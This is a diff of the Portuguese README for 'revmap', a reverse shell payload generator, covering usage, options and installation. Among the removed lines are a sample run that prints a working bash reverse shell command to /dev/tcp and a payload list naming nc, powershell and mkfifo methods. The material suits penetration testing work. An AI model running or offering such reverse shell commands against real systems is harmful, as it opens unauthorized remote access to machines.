@@ -29,10 +29,7 @@ Projetei o `revmap` para cumprir todas as responsabilidades para gera payloads e
 # Forma de utilização
 
 ```sh
-revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
-revmap --ip 192.168.4.80 --port 4444 --payload bash 
-revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
+revmap --ip 192.168.4.80 --port 4444
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
@@ -40,15 +37,13 @@ Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele s
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.4 - @joaoviictorti 
+        v0.0.5 - @joaoviictorti 
 
 options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
+  -h, --help    show this help message and exit
+  --version     show program's version number and exit
+  --ip IP       Insert ip
+  --port PORTA  Insert port
 ```
 
 # Instalação
@@ -61,18 +56,6 @@ pip3 install revmap
 
 # Executando revmap
 
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.4 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
-
+![logo_do_projeto](images/revmap_console.png)
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
